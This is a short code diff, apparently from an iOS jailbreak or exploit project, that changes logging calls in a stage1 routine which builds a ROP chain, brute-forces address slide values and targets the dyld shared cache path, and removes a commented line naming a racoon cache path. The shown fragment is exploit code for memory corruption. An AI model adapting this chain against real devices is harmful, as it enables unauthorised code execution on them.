@@ -34,7 +34,7 @@ void stage1(int fd, offset_struct_t * offsets) {
 
 	// get an address which is in the region that is always writeable and doesn't cotain a quote if we convert it into a string
 	uint64_t ropchain_addr = get_ropchain_addr(offsets);
-	printf("Chain will be at: %llx\n",ropchain_addr);
+	LOG("Chain will be at: %llx",ropchain_addr);
 
 	// write all the values which shouldn't be slid
 	rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
@@ -55,7 +55,7 @@ void stage1(int fd, offset_struct_t * offsets) {
 		curr_gadget = curr_gadget->next;
 	}
 	int iterations = (offsets->max_slide/offsets->slide_value);
-	printf("%d iterations\n",iterations);
+	LOG("%d iterations",iterations);
 	for (int i = iterations; i >= 0; i--) {
 		uint64_t slide = i*offsets->slide_value;
 		
@@ -194,7 +194,6 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	};
 	union path_union path;
 	snprintf((char*)&path.path,62,"/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64");
-	//snprintf(&path.path,62,"/private/etc/racoon/cache");
 	
 
 	ROP_SETUP(offsets->stage1_ropchain);
